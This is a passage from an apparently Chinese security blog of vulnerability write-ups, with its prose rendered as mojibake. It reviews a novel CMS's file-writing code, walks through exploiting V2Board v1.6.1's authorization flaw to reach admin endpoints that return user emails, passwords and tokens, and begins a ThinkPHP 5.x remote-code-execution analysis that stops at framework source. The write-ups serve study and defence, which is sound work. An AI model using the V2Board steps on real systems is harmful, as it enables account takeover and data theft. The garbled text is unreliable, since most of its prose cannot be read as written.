class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯¹ä¸€å®šæ—¶é—´å†…æ›´æ–°æ•°ä¹Ÿæœ‰é™åˆ¶ï¼Œæ‰€ä»¥å¦‚æœæƒ³åˆ©ç”¨ç­¾çº¦ä½œè€…è´¦å·çˆ†åº“è¿˜æ˜¯æœ‰ç‚¹éš¾</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php   </span></span><br><span class="line">           <span class="comment">//åˆ¤æ–­äº”åˆ†é’Ÿå†…æ›´æ–°æ•°é‡</span></span><br><span class="line">           <span class="variable">$time</span> = <span class="title function_ invoke__">time</span>()-<span class="number">300</span>;</span><br><span class="line">           <span class="variable">$mnum</span> = <span class="variable language_">$this</span>-&gt;mcdb-&gt;<span class="title function_ invoke__">get_nums</span>(<span class="variable">$table</span>,<span class="keyword">array</span>(<span class="string">&#x27;bid&#x27;</span>=&gt;<span class="variable">$bid</span>,<span class="string">&#x27;addtime&gt;&#x27;</span>=&gt;<span class="variable">$time</span>));</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$mnum</span> &gt; <span class="number">5</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;ç³»ç»Ÿæ£€æµ‹åˆ°ä½ æœ‰éæ³•æš´åº“è¡Œä¸º~ï¼&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/post/CMS-Test/image-20221123123229249.png" alt="image-20221123123229249"></p>
<p>ä½†æ˜¯å…¶å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œéƒ½é»˜è®¤ä¸º<code>txt</code>æ–‡ä»¶</p>
<p>è€Œä¸”å¯¹ç±»ä¼¼<code>&lt;&gt;</code>ç‰¹æ®Šç¬¦å·ä¹Ÿè¿›è¡Œäº†ç¼–è¯‘</p>
<p><img src="/post/CMS-Test/image-20221124133546733.png" alt="image-20221124133546733"></p>
<p><img src="/post/CMS-Test/image-20221124133558480.png" alt="image-20221124133558480"></p>
<p>ç¨å¾®çœ‹çœ‹å°è¯´æ–‡æœ¬æ–‡ä»¶ç”Ÿæˆçš„ä»£ç æµç¨‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php</span></span><br><span class="line">        <span class="comment">//å†™å…¥å°è¯´åˆ°TXTæ–‡æœ¬</span></span><br><span class="line">        <span class="title function_ invoke__">get_book_txt</span>(<span class="variable">$bid</span>,<span class="variable">$id</span>,<span class="variable">$text</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;æ­å–œæ‚¨ï¼Œæ“ä½œæˆåŠŸ~!&#x27;</span>;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="title function_ invoke__">get_url</span>(<span class="string">&#x27;author/bookchapter/index/&#x27;</span>.<span class="variable">$bid</span>);</span><br><span class="line">        <span class="title function_ invoke__">get_json</span>(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">/*è¿™æ˜¯æŠŠä½œè€…æ–‡ç« å†™å…¥å­˜å‚¨ç›®å½•çš„ä»£ç */</span></span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿› <code>get_book_txt</code>å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//è·å–å°è¯´txtæ–‡æœ¬</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_book_txt</span>(<span class="params"><span class="variable">$bid</span>,<span class="variable">$zid</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$txt_file</span> = FCPATH.<span class="string">&#x27;caches/txt/&#x27;</span>.<span class="variable">$bid</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$zid</span>.Mc_Book_Key).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="comment">/*è¿™é‡Œä¿®æ”¹äº†æ–‡æœ¬åå­—*/</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$text</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">write_file</span>(<span class="variable">$txt_file</span>, <span class="variable">$text</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$txt_file</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">/*è¿™é‡Œå°±æ˜¯å¯¹æ”¹æ–‡ç« æ˜¯å¦é‡å¤çš„åˆ¤æ–­*/</span></span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt_file</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†è·Ÿè¿›<code>write_file</code>å‡½æ•°</p>
<p>çœ‹çœ‹æˆ‘ä»¬çš„æ–‡æœ¬æ˜¯æ€ä¹ˆå†™å…¥æ–‡ä»¶çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å†™æ–‡ä»¶</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_file</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span>, <span class="variable">$mode</span> = FOPEN_WRITE_CREATE_DESTRUCTIVE</span>)</span>&#123;</span><br><span class="line">	<span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$path</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) <span class="title function_ invoke__">mkdirss</span>(<span class="variable">$dir</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$fp</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="variable">$mode</span>)) <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_EX);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$data</span>);</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_UN);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŸæ¥æ˜¯ç›´æ¥ç”¨<code>fwrite</code>å†™å…¥æ–‡ä»¶ï¼Œè€Œå­—ç¬¦å¼€å§‹å°±è¢«<code>html</code>è½¬ä¹‰äº†ï¼Œæ‰€ä»¥å†™å…¥çš„ç»“æœè‚¯å®šæ˜¯è½¬ä¹‰åçš„ç»“æœ</p>
<h4 id="çŒœæµ‹"><a href="#çŒœæµ‹" class="headerlink" title="çŒœæµ‹"></a>çŒœæµ‹</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">å¯èƒ½æ˜¯å­˜åœ¨å‚æ•°å˜é‡å¯ä»¥è¢«ä»£ç æ‰§è¡Œå‡½æ•°è¦†ç›–ï¼Œå†é€šè¿‡ä¸å…¶ä»–å‚æ•°ç»“åˆï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•å®Œæˆ</p>
<h1 id="V2Board-v1-6-1-è¶Šæƒè®¿é—®æ¼æ´"><a href="#V2Board-v1-6-1-è¶Šæƒè®¿é—®æ¼æ´" class="headerlink" title="V2Board  v1.6.1 è¶Šæƒè®¿é—®æ¼æ´"></a>V2Board  v1.6.1 è¶Šæƒè®¿é—®æ¼æ´</h1><p>è¿™æ˜¯åœ¨æŸæ¬¡æ¯”èµ›é‡åˆ°çš„ä¸€é“é¢˜ï¼Œåªæ‹¿äº†é¢˜ç›®ä¸“é—¨æ¥è®°å½•è¿™ä¸ªæ¼æ´ï¼Œå¹¶æ²¡ä¸‹è½½ä»£ç æµ‹è¯•</p>
<h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a><strong>æ¼æ´æè¿°</strong></h2><p><code>V2board</code>é¢æ¿ <code>Admin.php</code> å­˜åœ¨è¶Šæƒè®¿é—®æ¼æ´ï¼Œç”±äºéƒ¨åˆ†é‰´æƒä»£ç äº<code>v1.6.1</code>ç‰ˆæœ¬è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‰´æƒæ–¹å¼å˜ä¸ºä»<code>Redis</code>ä¸­è·å–ç¼“å­˜åˆ¤å®šæ˜¯å¦å­˜åœ¨å¯ä»¥è°ƒç”¨æ¥å£ï¼Œå¯¼è‡´ä»»æ„ç”¨æˆ·éƒ½å¯ä»¥è°ƒç”¨ç®¡ç†å‘˜æƒé™çš„æ¥å£è·å–åå°æƒé™</p>
<p>ä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯ä»ç¼“å­˜ä¸­æ¥åˆ¤æ–­æƒé™ï¼Œä¸€æ—¦åˆ¤æ–­æˆåŠŸï¼Œå°±å¯ä»¥ä»¥<code>admin</code>èº«ä»½å»è®¿é—®å…¶ä»–ä¸å¯è®¿é—®çš„æ•æ„Ÿå†…å®¹ï¼Œæ¯”å¦‚<code>admin</code>çš„å¯†ç ç­‰ç­‰</p>
<h2 id="æ¼æ´ä»£ç åˆ†æ"><a href="#æ¼æ´ä»£ç åˆ†æ" class="headerlink" title="æ¼æ´ä»£ç åˆ†æ"></a>æ¼æ´ä»£ç åˆ†æ</h2><p>ä»£ç ä½ç½®ï¼š<code>app/Http/Middleware/Admin.php</code></p>
<p><img src="/post/CMS-Test/image-20230113161644874.png" alt="image-20230113161644874"></p>
<p>è¿™é‡Œçš„ä»£ç å°±æ˜¯åˆ¤æ–­<code>redis</code>ç¼“å­˜ä¸­æ˜¯å¦å­˜åœ¨<code>authorization</code>ï¼Œå¦‚æœå­˜åœ¨å°±å…è®¸è°ƒç”¨<code>admin</code>çš„æ¥å£ï¼Œæ‰€ä»¥ä¸€æ—¦å­˜åœ¨</p>
<p><code>authorization</code>å°±å¯ä»¥è°ƒç”¨è¯¥æ¥å£ï¼Œä½†æ˜¯å¹¶æ²¡ç”¨è¿›ä¸€æ­¥åˆ¤æ–­<code>authorization</code>ä¸­æ˜¯å¦å±äº<code>admin</code></p>
<p>ä¸»è¦è¦é€šè¿‡ä¸¤æ¬¡é€»è¾‘å®ç°éªŒè¯ï¼Œä¸€ä¸ªæ˜¯å­˜åœ¨ <code>header</code> ä¸­çš„ <code>authorization</code> å‚æ•°ï¼Œå†ä¸€ä¸ªæ˜¯æ ¡éªŒ <code>authorizations</code> æ˜¯å¦å­˜åœ¨äº<code>Redis</code>ç¼“å­˜ä¸­çš„</p>
<p>åœ¨è¿”å›åŒ…æ•°æ®ä¸­ï¼Œ</p>
<p><img src="/post/CMS-Test/image-20230113165445597.png" alt="image-20230113165445597"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œåœ¨ç™»å½•æ—¶ä¼šè¿”å›<code>token</code>ï¼Œ<code>auth_data</code></p>
<p>è€Œ<code>auth_data</code>å’Œ<code>authorization</code>ä¸¤ä¸ªæ ¼å¼éƒ½æ˜¯ä¸€æ ·çš„<code>base64_encode(&quot;username:password&quot;)</code></p>
<p>ä½†æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼Œè¿™é‡Œå°±å¯èƒ½å­˜åœ¨é€»è¾‘æ¼æ´è¶Šæƒ</p>
<h2 id="æ¼æ´æµ‹è¯•"><a href="#æ¼æ´æµ‹è¯•" class="headerlink" title="æ¼æ´æµ‹è¯•"></a>æ¼æ´æµ‹è¯•</h2><p>å…ˆè¿›è¡Œæ³¨å†Œä¸€ä¸ªæ™®é€šæƒé™çš„</p>
<p><img src="/post/CMS-Test/image-20230113161201687.png" alt="image-20230113161201687"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">è´¦å·ï¼š<span class="symbol">123@</span>qq.com</span><br><span class="line">å¯†ç ï¼š<span class="number">123456789</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ç™»å½•æ—¶è¿›è¡ŒæŠ“åŒ…</p>
<p>è¿”å›åŒ…ä¼šè¿”å›æˆ‘ä»¬çš„<code>token</code>å’Œ<code>auth_data</code></p>
<p><img src="/post/CMS-Test/image-20230113165230066.png" alt="image-20230113165230066"></p>
<p>åŒæ—¶ <code>auth_data</code> ä¼šç¼“å­˜äº <code>Redis</code> ä¸­</p>
<p>ä½†æ˜¯è¿˜æ˜¯éœ€è¦æŠŠè¿™ä¸ª<code>auth_data</code>å†™è¿›<code>authorization</code></p>
<p>å¦‚æœä¸å†™å…¥ç›´æ¥è®¿é—®<code>/admin</code>å°±ä¼šå¼¹å‡ºç¦æ­¢ï¼Œå› ä¸ºåœ¨ç¼“å­˜ä¸­æ™®é€šç”¨æˆ·çš„æ•°æ®æ˜¯ä»¥<code>auth_data</code>ï¼Œ</p>
<p><img src="/post/CMS-Test/image-20230113171237926.png" alt="image-20230113171237926"></p>
<p>æ‰€ä»¥é€šè¿‡ä¸‹é¢è®¿é—®<code>/api/v1/user/info</code>ï¼Œå½“ç„¶è®¿é—®å…¶ä»–ä½ç½®ä¹Ÿå¯ä»¥ï¼Œåªè¦èƒ½æŠŠ<code>authorization</code>å‚æ•°æŠŠæ™®é€šç”¨æˆ·æ•°æ®æ·»åŠ åˆ°è¯·æ±‚ä½“ä¸­ï¼Œå¹¶ä¸”æˆåŠŸå‘é€</p>
<p>ä»è€Œæ™®é€šç”¨æˆ·çš„æ•°æ®ä¹Ÿä»¥<code>authorization</code>å‚æ•°å½¢å¼ä¿å­˜åˆ°<code>redis</code>ç¼“å­˜ä¸­å»äº†</p>
<p><img src="/post/CMS-Test/image-20230113172957033.png" alt="image-20230113172957033"></p>
<p>å¦‚ä½•æˆ‘ä»¬å°±å¯ä»¥è®¿é—®<code>admin</code>æ‰å¯ä»¥è®¿é—®çš„ä¿¡æ¯</p>
<p>æ¯”å¦‚<code>/api/v1/admin/user/fetch</code>ï¼Œè¿™å°±æ˜¯ä»¥<code>admin</code>æŸ¥çœ‹è®¿é—®<code>user</code>çš„ä¿¡æ¯</p>
<p><img src="/post/CMS-Test/image-20230113180827350.png" alt="image-20230113180827350"></p>
<p>æˆåŠŸè®¿é—®</p>
<p>å¹¶ä¸”å¾—åˆ°<code>email</code>,<code>password</code>,<code>token</code>ç­‰ä¿¡æ¯</p>
<p><img src="/post/CMS-Test/image-20230113180921938.png" alt="image-20230113180921938"></p>
<p>æµ‹è¯•å®Œæˆ</p>
<h1 id="ThinkPHP-5-x-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#ThinkPHP-5-x-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="ThinkPHP 5.x è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>ThinkPHP 5.x è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</h1><blockquote>
<p>å¥½è€çš„æ´ï¼Œæœ€è¿‘åœ¨ä¸€ä¸ªå­¦å¼Ÿå‘çš„é¢˜ç›®ä¸­çœ‹çš„ï¼Œè™½ç„¶åšå‡ºäº†ï¼Œä½†æ˜¯<code>thinkphp</code>åšçš„å¤ªå°‘äº†è¿˜æ˜¯çš„æ‰¾ç‚¹æ¥æ‰“æ‰“(å®¡Javaæ‰æ˜¯æ­£é“</p>
</blockquote>
<h2 id="æ¼æ´å½±å“èŒƒå›´"><a href="#æ¼æ´å½±å“èŒƒå›´" class="headerlink" title="æ¼æ´å½±å“èŒƒå›´"></a>æ¼æ´å½±å“èŒƒå›´</h2><blockquote>
<p>5.x &lt; 5.1.31</p>
<p>5.x &gt;&#x3D; 5.0.23</p>
</blockquote>
<h2 id="æ¼æ´å¤ç°ç¯å¢ƒ"><a href="#æ¼æ´å¤ç°ç¯å¢ƒ" class="headerlink" title="æ¼æ´å¤ç°ç¯å¢ƒ"></a>æ¼æ´å¤ç°ç¯å¢ƒ</h2><blockquote>
<p>thinkphp ï¼šV5.1.29</p>
<p>Apacheï¼šV2.4.39</p>
<p>phpï¼šV5.6.9nts</p>
</blockquote>
<p><img src="/post/CMS-Test/image-20231009164442382.png" alt="image-20231009164442382"></p>
<h2 id="æ¼æ´ä»£ç åˆ†æ-1"><a href="#æ¼æ´ä»£ç åˆ†æ-1" class="headerlink" title="æ¼æ´ä»£ç åˆ†æ"></a>æ¼æ´ä»£ç åˆ†æ</h2><p>å…ˆçœ‹å®˜æ–¹æ›´æ–°è¡¥ä¸ï¼Œ</p>
<blockquote>
<p><a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">5.1.xä¿®å¤</a></p>
<p><a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">5.0.xä¿®å¤</a></p>
<p>ä¸¤è€…ä¿®å¤åŒºåˆ«ä¸å¤§ï¼Œ<code>5.1.x</code>åªæœ‰æ¯”<code>5.0.x</code>å¤šäº†æœ‰å¦‚ä¸‹å›¾çš„<code>70line</code>çš„é‚£è¡Œä»£ç </p>
</blockquote>
<p><img src="/post/CMS-Test/image-20231009162634591.png" alt="image-20231009162634591"></p>
<p>å¯ä»¥çœ‹åˆ°ä¿®å¤åçš„ä»£ç å¯¹<code>controller</code>è¿›è¡Œäº†ä¸¥æ ¼è¿‡æ»¤ï¼Œè€Œåœ¨ä¹‹å‰çš„ä»£ç ä¸­æ˜¯ç›´æ¥è¯»å–æ§åˆ¶å™¨åå­—ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$controller</span>       = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$result</span>[<span class="number">1</span>] ?: <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;default_controller&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/post/CMS-Test/image-20231009170933411.png" alt="image-20231009170933411"></p>
<p>æ—¢ç„¶è¿™ä¹ˆä¸¥æ ¼ è¿‡æ»¤ï¼Œæ‰€ä»¥çŒœæµ‹<code>$controller</code>å°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´çš„å…³é”®æˆ–è€…æ˜¯å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„å‚æ•°ï¼Œå…¨å±€æŸ¥æ‰¾å‘½ä»¤æ‰§è¡Œæ‰§è¡Œå‡½æ•°çš„ä½ç½®</p>
<p>æ­£å¥½å°±åœ¨åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// ç›‘å¬module_init</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// å®ä¾‹åŒ–æ§åˆ¶å™¨</span></span><br><span class="line">            <span class="variable">$instance</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">controller</span>(<span class="variable">$this</span>-&gt;controller,</span><br><span class="line">                <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$instance</span> <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">                <span class="variable">$instance</span>-&gt;<span class="title function_ invoke__">registerMiddleware</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getClass</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;<span class="title function_ invoke__">controller</span>(function (Request <span class="variable">$request</span>, <span class="variable">$next</span>) <span class="keyword">use</span> ($<span class="title">instance</span>) &#123;</span><br><span class="line">            // è·å–å½“å‰æ“ä½œå</span><br><span class="line">            $<span class="title">action</span> = $<span class="title">this</span>-&gt;<span class="title">actionName</span> . $<span class="title">this</span>-&gt;<span class="title">rule</span>-&gt;<span class="title">getConfig</span>(&#x27;<span class="title">action_suffix</span>&#x27;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$instance</span>, <span class="variable">$action</span>])) &#123;</span><br><span class="line">                <span class="comment">// æ‰§è¡Œæ“ä½œæ–¹æ³•</span></span><br><span class="line">                <span class="variable">$call</span> = [<span class="variable">$instance</span>, <span class="variable">$action</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å</span></span><br><span class="line">                <span class="variable">$reflect</span>    = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable">$instance</span>, <span class="variable">$action</span>);</span><br><span class="line">                <span class="variable">$methodName</span> = <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line">                <span class="variable">$suffix</span>     = <span class="variable language_">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">                <span class="variable">$actionName</span> = <span class="variable">$suffix</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$methodName</span>, <span class="number">0</span>, -<span class="title function_ invoke__">strlen</span>(<span class="variable">$suffix</span>)) : <span class="variable">$methodName</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">setAction</span>(<span class="variable">$actionName</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">                <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">                ? <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">route</span>()</span><br><span class="line">                : <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">param</span>();</span><br><span class="line">                <span class="variable">$vars</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;param);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$instance</span>, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// ç©ºæ“ä½œ</span></span><br><span class="line">                <span class="variable">$call</span>    = [<span class="variable">$instance</span>, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">                <span class="variable">$vars</span>    = [<span class="variable language_">$this</span>-&gt;actionName];</span><br><span class="line">                <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable">$instance</span>, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// æ“ä½œä¸å­˜åœ¨</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . <span class="title function_ invoke__">get_class</span>(<span class="variable">$instance</span>) . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$action</span> . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;action_begin&#x27;</span>, <span class="variable">$call</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">invokeReflectMethod</span>(<span class="variable">$instance</span>, <span class="variable">$reflect</span>, <span class="variable">$vars</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoResponse</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="variable">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/post/CMS-Test/image-20231009171248934.png" alt="image-20231009171248934"></p>
<p>è¿™é‡Œé€šè¿‡<code>$this-&gt;app-&gt;controller</code>æ¥å®ç°å®ä¾‹åŒ–æ§åˆ¶å™¨ï¼Œä»è€Œè°ƒç”¨è¿™ä¸ªå®ä¾‹çš„æ–¹æ³•ã€‚</p>
<p>ä¸ºäº†æ‰¾åˆ°æ§åˆ¶å™¨æ˜¯å¦‚ä½•å®ç°å‘½ä»¤æ‰§è¡Œè·Ÿè¿›ï¼Œ<code>app--&gt;constroller</code>ï¼Œå®šä¹‰åœ¨<code>App.php</code>ä¸­ï¼Œ</p>
<p><img src="/post/CMS-Test/image-20231009171439187.png" alt="image-20231009171439187"></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨å®ä¾‹ä¸­çš„å¤§å¤šå‚æ•°ï¼Œéƒ½è¢«<code>parseModuleAndClass</code> å¤„ç†ï¼Œå¹¶è§£æä¸º<code>$module</code>å’Œ<code>$class</code>ï¼Œå°¤å…¶æ ¹æ®æ›´æ–°æ–‡æ¡£ä¸­æ§åˆ¶å™¨åå­—<code>$this-&gt;controller</code>ï¼Œä¹Ÿå°±æ˜¯ä¸Šå›¾ä¸­çš„å‚æ•°<code>$name</code>ï¼Œæœ€æœ‰å¯èƒ½è¿™é‡Œå‘ç”Ÿäº†ä¸€äº›å˜åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å®ä¾‹åŒ–æ§åˆ¶å™¨</span></span><br><span class="line"><span class="variable">$instance</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">controller</span>(<span class="variable">$this</span>-&gt;controller,</span><br><span class="line">   <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">   <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">   <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>è·Ÿç€çœ‹çœ‹<code>$module</code>å’Œ<code>$class</code>æœ‰ä»€ä¹ˆä½œç”¨ï¼Œ</p>
<p>åœ¨ä¸Šå›¾ä¸­$classè¢«ç”¨æ¥æµ‹è¯•ç±»æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±è¿›è¡Œå®ä¾‹åŒ–ï¼Œå¦‚ä¸‹å›¾ä¸¤ä¸ªå‡½æ•°</p>
<p><img src="/post/CMS-Test/image-20231009172603174.png" alt="image-20231009172603174"></p>
<p><img src="/post/CMS-Test/image-20231009172638149.png" alt="image-20231009172638149"></p>
<p>è€Œ<code>$module</code>åœ¨è¿™é‡Œèµ·åˆ°ä¸€ä¸ªç”ŸæˆåŠ¨æ€å‘½åç©ºé—´çš„ä½œç”¨</p>
<p><img src="/post/CMS-Test/image-20231009172953514.png" alt="image-20231009172953514"></p>
<p>ç„¶åï¼Œå¼€å§‹è·Ÿè¿›<code>parseModuleAndClass</code>æ–¹æ³•ï¼Œ</p>
<p><img src="/post/CMS-Test/image-20231009173812659.png" alt="image-20231009173812659"></p>
